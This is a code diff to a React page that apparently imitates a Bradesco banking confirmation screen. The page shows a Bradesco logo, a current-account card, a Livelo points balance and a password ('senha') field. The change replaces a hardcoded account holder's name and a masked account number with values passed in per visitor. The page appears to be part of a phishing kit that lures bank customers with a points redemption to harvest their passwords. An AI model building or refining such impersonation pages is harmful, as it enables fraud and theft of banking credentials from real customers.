@@ -1,7 +1,10 @@
 import { useState } from "react";
+import { useLocation } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 
 const Confirmacao = () => {
+  const location = useLocation();
+  const { nome, conta } = (location.state as any) || {};
   const [senha, setSenha] = useState("");
   const [selected, setSelected] = useState<"fatura" | "saldo">("saldo");
 
@@ -14,11 +17,11 @@ const Confirmacao = () => {
 
       {/* Account Card */}
       <div className="mx-5 bg-white rounded-xl p-5 mb-4">
-        <h2 className="text-foreground font-bold text-base mb-3">JAIR MESSIAS BOLSONARO</h2>
+        <h2 className="text-foreground font-bold text-base mb-3">{nome || "1º TITULAR"}</h2>
         <p className="text-muted-foreground text-xs mb-1">Detalhes</p>
         <p className="text-foreground text-sm font-semibold">237 - BANCO BRADESCO S.A.</p>
         <p className="text-muted-foreground text-xs">Conta Corrente Individual</p>
-        <p className="text-muted-foreground text-xs mt-1">**24 / ***24-3</p>
+        <p className="text-muted-foreground text-xs mt-1">{conta || "---"}</p>
         <div className="flex items-center justify-between mt-4">
           <span className="text-foreground font-bold text-base italic">livelo</span>
           <span className="text-[#D7004D] font-bold text-lg">120.425 pts</span>
